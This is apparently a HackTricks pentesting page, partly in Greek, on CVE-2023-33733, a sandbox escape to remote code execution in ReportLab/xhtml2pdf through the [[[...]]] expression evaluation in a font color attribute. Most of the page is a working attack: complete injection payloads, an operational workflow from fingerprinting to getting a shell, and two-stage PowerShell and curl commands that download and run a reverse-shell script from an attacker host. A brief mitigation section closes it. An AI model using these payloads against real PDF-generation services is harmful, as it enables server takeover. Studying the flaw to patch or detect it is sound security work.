# ReportLab/xhtml2pdf [[[...]]] expression-evaluation RCE (CVE-2023-33733)

{{#include ../../../banners/hacktricks-training.md}}

Αυτή η σελίδα τεκμηριώνει ένα πρακτικό sandbox escape και RCE primitive στο ReportLab’s rl_safe_eval που χρησιμοποιείται από xhtml2pdf και άλλες διεργασίες δημιουργίας PDF όταν αποδίδουν HTML που ελέγχεται από χρήστη σε PDF.

CVE-2023-33733 επηρεάζει τις εκδόσεις ReportLab έως και 3.6.12. Σε ορισμένα περιβάλλοντα attribute (για παράδειγμα color), τιμές τυλιγμένες σε triple brackets [[[ ... ]]] αξιολογούνται server-side από το rl_safe_eval. Με το σχεδιασμό ενός payload που περιστρέφεται από ένα whitelisted builtin (pow) προς τα globals της Python function, ένας επιτιθέμενος μπορεί να φτάσει το module os και να εκτελέσει εντολές.

Key points
- Trigger: inject [[[ ... ]]] into evaluated attributes such as <font color="..."> within markup parsed by ReportLab/xhtml2pdf.
- Sandbox: rl_safe_eval αντικαθιστά επικίνδυνα builtins αλλά οι αξιολογημένες συναρτήσεις εξακολουθούν να εκθέτουν __globals__.
- Bypass: κατασκευάστε μια προσωρινή κλάση Word για να παρακάμψετε τους ελέγχους ονομάτων του rl_safe_eval και να αποκτήσετε πρόσβαση στο string "__globals__" ενώ αποφεύγετε το φιλτράρισμα των μπλοκαρισμένων dunder.
- RCE: getattr(pow, Word("__globals__"))["os"].system("<cmd>")
- Stability: Επιστρέψτε μια έγκυρη τιμή για το attribute μετά την εκτέλεση (για color, χρησιμοποιήστε και 'red').

When to test
- Εφαρμογές που προσφέρουν εξαγωγή HTML-to-PDF (profiles, invoices, reports) και εμφανίζουν xhtml2pdf/ReportLab στα metadata του PDF ή σε σχόλια στην HTTP απάντηση.
- exiftool profile.pdf | egrep 'Producer|Title|Creator' → "xhtml2pdf" producer
- Η HTTP απάντηση για PDF συχνά ξεκινά με ένα σχόλιο generator του ReportLab

How the sandbox bypass works
- rl_safe_eval αφαιρεί ή αντικαθιστά πολλά builtins (getattr, type, pow, ...) και εφαρμόζει φιλτράρισμα ονομάτων για να αρνηθεί attributes που ξεκινούν με __ ή βρίσκονται σε denylist.
- Ωστόσο, οι ασφαλείς συναρτήσεις ζουν σε ένα λεξικό globals προσβάσιμο ως func.__globals__.
- Χρησιμοποιήστε type(type(1)) για να ανακτήσετε την πραγματική builtin type function (παρακάμπτοντας το wrapper του ReportLab), και στη συνέχεια ορίστε μια κλάση Word που κληρονομεί από str με μεταμορφωμένη συμπεριφορά συγκρίσεων έτσι ώστε:
  - .startswith('__') → πάντα False (παρακάμπτει τον έλεγχο name startswith('__'))
  - .__eq__ επιστρέφει False μόνο στην πρώτη σύγκριση (παρακάμπτει τους ελέγχους membership στην denylist) και True στη συνέχεια (ώστε να δουλέψει το Python getattr)
  - .__hash__ ισούται με hash(str(self))
- Με αυτόν τον τρόπο getattr(pow, Word('__globals__')) επιστρέφει το globals dict της τυλιγμένης pow function, το οποίο περιλαμβάνει το εισαγμένο module os. Έπειτα: ['os'].system('<cmd>').

Minimal exploitation pattern (attribute example)
Τοποθετήστε το payload μέσα σε ένα αξιολογούμενο attribute και βεβαιωθείτε ότι επιστρέφει μια έγκυρη τιμή για το attribute μέσω boolean και 'red'.

<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('ping 10.10.10.10') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
exploit
</font></para>

- Η μορφή με list-comprehension επιτρέπει μια μονοκλειστή έκφραση αποδεκτή από rl_safe_eval.
- Το τελικό and 'red' επιστρέφει ένα έγκυρο CSS color ώστε το rendering να μην σπάσει.
- Αντικαταστήστε την εντολή όπως χρειάζεται· χρησιμοποιήστε ping για να επικυρώσετε την εκτέλεση με tcpdump.

Operational workflow
1) Identify PDF generator
- Ο PDF Producer εμφανίζει xhtml2pdf; η HTTP απάντηση περιέχει σχόλιο ReportLab.
2) Find an input reflected into the PDF (e.g., profile bio/description) and trigger an export.
3) Verify execution with low-noise ICMP
- Εκτέλεση: sudo tcpdump -ni <iface> icmp
- Payload: ... system('ping <your_ip>') ...
- Τα Windows συχνά στέλνουν ακριβώς τέσσερα echo requests από προεπιλογή.
4) Establish a shell
- Για Windows, μια αξιόπιστη two-stage προσέγγιση αποφεύγει προβλήματα quoting/encoding:
- Stage 1 (download):

<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('powershell -c iwr http://ATTACKER/rev.ps1 -o rev.ps1') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">exploit</font></para>

- Stage 2 (execute):

<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('powershell ./rev.ps1') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">exploit</font></para>

- Για Linux στόχους, παρόμοιο two-stage με curl/wget είναι εφικτό:
- system('curl http://ATTACKER/s.sh -o /tmp/s; sh /tmp/s')

Notes and tips
- Attribute contexts: το color είναι ένα γνωστό αξιολογούμενο attribute; άλλα attributes στο ReportLab markup μπορεί επίσης να αξιολογούν εκφράσεις. Αν μια θέση είναι sanitized, δοκιμάστε άλλες που αποδίδονται στη ροή του PDF (διαφορετικά πεδία, table styles, κ.λπ.).
- Quoting: Κρατήστε τις εντολές συμπαγείς. Οι two-stage λήψεις μειώνουν δραστικά τα προβλήματα quoting/escaping.
- Reliability: Αν οι εξαγωγές είναι cached ή queued, διαφοροποιήστε ελαφρώς το payload (π.χ., τυχαίο path ή query) για να αποφύγετε cache hits.

Mitigations and detection
- Αναβαθμίστε το ReportLab στην 3.6.13 ή νεότερη (CVE-2023-33733 fixed). Παρακολουθείτε επίσης advisories ασφαλείας σε πακέτα διανομής.
- Μην δίνετε user-controlled HTML/markup απευθείας σε xhtml2pdf/ReportLab χωρίς αυστηρό sanitization. Αφαιρέστε/απορρίψτε την αξιολόγηση [[[...]]] και vendor-specific tags όταν το input δεν είναι αξιόπιστο.
- Σκεφτείτε να απενεργοποιήσετε ή να τυλίξετε πλήρως τη χρήση του rl_safe_eval για μη αξιόπιστα inputs.
- Παρακολουθήστε για ύποπτες εξερχόμενες συνδέσεις κατά τη δημιουργία PDF (π.χ., ICMP/HTTP από servers εφαρμογής κατά την εξαγωγή εγγράφων).

References
- PoC and technical analysis: [c53elyas/CVE-2023-33733](https://github.com/c53elyas/CVE-2023-33733)
- 0xdf University HTB write-up (πραγματική εκμετάλλευση, Windows two-stage payloads): [HTB: University](https://0xdf.gitlab.io/2025/08/09/htb-university.html)
- NVD entry (affected versions): [CVE-2023-33733](https://nvd.nist.gov/vuln/detail/cve-2023-33733)
- xhtml2pdf docs (markup/page concepts): [xhtml2pdf docs](https://xhtml2pdf.readthedocs.io/en/latest/format_html.html)

{{#include ../../../banners/hacktricks-training.md}}
